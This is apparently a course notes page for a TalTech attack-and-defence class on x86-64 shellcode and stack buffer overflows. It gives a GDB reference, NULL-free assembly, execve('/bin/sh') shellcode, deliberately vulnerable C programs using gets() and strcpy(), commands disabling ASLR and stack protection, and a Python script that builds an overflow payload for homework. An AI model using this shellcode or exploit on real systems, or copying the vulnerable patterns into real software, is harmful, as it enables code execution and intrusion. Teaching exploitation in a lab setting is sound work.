---
layout: about
title:  Notes for TalTech A&D course
#description: >
#  This is the description sentence displayed on the top of the About page and in search engines
# hide_description: true
image: /assets/img/blog/hydejack-8.png
menu: true
order: 4
---



Subtopics:

* [Testing shellcode](/cheatsheet/#test-shellcode)
* [Hello World! in .data section](/cheatsheet/#hello-world-in-data-section)
* [Hello World! JCP technique](/cheatsheet/#hello-world-jcp-technique)
* [Execve](/cheatsheet/#execve)
* [Buffer overflow](/cheatsheet/#buffer-overflow)
* [GDB reference](/cheatsheet/#gdb-reference)

Homework:

* [Homework](/cheatsheet/#homework) - deadline 1st of December, 23:59

All the examples have been tested on Ubuntu 20.04 LTS, kernel version 5.11.0-41-generic.

## [GDB reference](#gdb-reference)

|Command |Description |
| ------------- |-------------|
| gdb ./file | open file `<file>` in gdb |
| break main | break at function eg. `<main>`|
| break *0x40056a | break at address |
| run | start debugging |
| si/stepi | step into (eg. step into function) |
| ni/nexti | step over (does not enter function, steps over it) |
| info breakpoints | examine breakpoints |
| p $rbp | print the value of $rbp |
| p $rbp-0x8 | print the value of $rbp-0x8 |
| x/x $rbp | print the value in hex at $rbp |
| x/x 0x7fffffffdda8 | print the value in hex at address |
| x/i $rbp | print the assembly instructions at address |
| x/8bx $rbp-0x28 | display 8 bytes in hex beginning from address at $rbp-0x28 |

## [Testing shellcode](#test-shellcode)

The usual shellcode testing program has been modified such that `code[]` is not a global variable anymore, but a local one. This change was made so that its value would still reside on stack.

Ref: <https://medium.com/csg-govtech/why-doesnt-my-shellcode-work-anymore-136ce179643f>

```
#include <stdio.h>
#include <string.h>

int main()
{
    char code[] = "<YOUR_SHELLCODE_HERE>";
    printf("len:%d bytes\n", strlen(code));
    (*(void(*)()) code)();
    return 0;
}

```

## [Hello World! in data section](#hello-world-in-data-section)

Example showing how to remove NULL bytes and making sure that the registers are cleaned up. 

```
;ssize_t write(int fd, const void *buf, size_t count);
;exit(0)

global _start
section .text

_start:
	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	xor rdx, rdx
	mov dil, 0x1		; stdout 1
	mov rsi, msg
	mov dl, 0xd		; 13 bytes

	mov al, 0x1		; write syscall 1
	syscall

exit:
	xor rax, rax
	xor rdi, rdi
	mov al, 0x3c		; exit syscall 60
	syscall

section .data
	msg: db "Hello World!", 0xa
```

## [Hello World JCP technique](#hello-world-jcp-technique)

Example shows the side-effect of the CALL instruction. When CALLing shellcode, the address of Hello World! is stored on the top of the stack, to keep track of where to continue the execution from once returning from shellcode. We can use that to POP that address right where we need it, in RSI in this example.

```
global _start
section .text

_start:
	jmp callshell

shellcode:
	pop rsi
	xor rdx, rdx
	mov dl, 0xd
	xor rdi, rdi
	add rdi, 1
	mov al, 0x1
	syscall

exit:
	xor rdi, rdi
	mov al, 0x3c
	syscall

callshell:
	call shellcode
	msg: db 'Hello World!', 0xa
```

## [Execve](#execve)

```
; Write an assembly program to execute shell using execve() syscall
; execve("/bin/sh", ["/bin/sh", null], NULL)
; Example based on http://shell-storm.org/shellcode/files/shellcode-806.php with slight modifications

global _start
section .text

_start:

;STEP 1 - RDX contains the pointer to the envionment variables (0x0)
        xor rdx, rdx

;STEP 2 - RDI needs to contain a pointer to the filename /bin/sh
	push rdx
	push rdx
	mov rbx, 0x68732f2f6e69622f
	push rbx
	push rsp
	pop rdi

;STEP 3 - RSI needs to contain the pointer to the argv (address to /bin/sh + 0x00..)
	push rdx
	push rdi
	push rsp
	pop rsi

;STEP 4 - prepare syscall execve() - 59 in dec, 0x3b in hex
	xor rax, rax
	mov al, 0x3b
	syscall
```

## [Buffer overflow](#bof)

**Disable ASLR:**<br>
`echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`

**Compile the file**<br>
`gcc -fno-stack-protector -z execstack buffer.c -o buffer`


In this program, 64 byte long buffer is allocated on the stack, however gets() allows us to store there more data than 64 bytes. Note that the buffer address in GDB is different than when running the program separately and that the buffer address is printed out in order to assist you in this case.
```
#include <stdio.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
	char buffer[64];
	printf("%p\n", buffer);
	printf("Please type your name: \n");
	gets(buffer);
}

```

python3./exploit.py
```
shellcode = b"\x48\x31\xd2\x52\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x48\x31\xc0\xb0\x3b\x0f\x05"
buffer = b"\x80\xdf\xff\xff\xff\x7f"
nop = b"\x90"

payload = b""
payload += shellcode
payload += (72 - len(shellcode)) * nop
payload += buffer
payload += b"\n"

print (len(payload))

file = open('payload', 'wb')
file.write(payload)
file.close()

```

It produces a payload file which you can execute together with the vulnerable program as `(cat payload | cat - ) | ./buffer`.

## [Homework](#homework)

### Task description:
* **Step 1**. Write a shellcode which prints out your name/nickname. Remove any NULL bytes and keep the shellcode as short as possible. To write the shellcode you basically only need to know how to use the write() and exit() syscalls<br>
* **Step 2**. Exploit the buffer overflow in the buffer.c program so that as a result, the shellcode you wrote in step 1 would get executed.

**Vulnerable buffer.c program**

**Disable ASLR**: `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`<br>
**Compile program**: `gcc -fno-stack-protector -z execstack buffer.c -o buffer`

buffer.c
```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int foo(char *str)
{
    char buffer[100];
    printf("%p\n",buffer);
    strcpy(buffer, str);
    return 1;
}

int main(int argc, char **argv)
{
    char str[400];

    FILE *secretfile;
    secretfile = fopen("secretfile", "r");
    fread(str, sizeof(char), 300, secretfile);
    foo(str);
    printf("All good\n");
    return 1;
}
```

**Run the program**: `./buffer`
```
$ ./buffer
0x7fffffffdbb0
All good
```

**Solution when run with your payload should look like as follows:**
```
$ ./buffer
0x7fffffffdbb0
Silvia
```

*[FLIP]: First-Last-Invert-Play. A coding technique to achieve performant page transition animations.
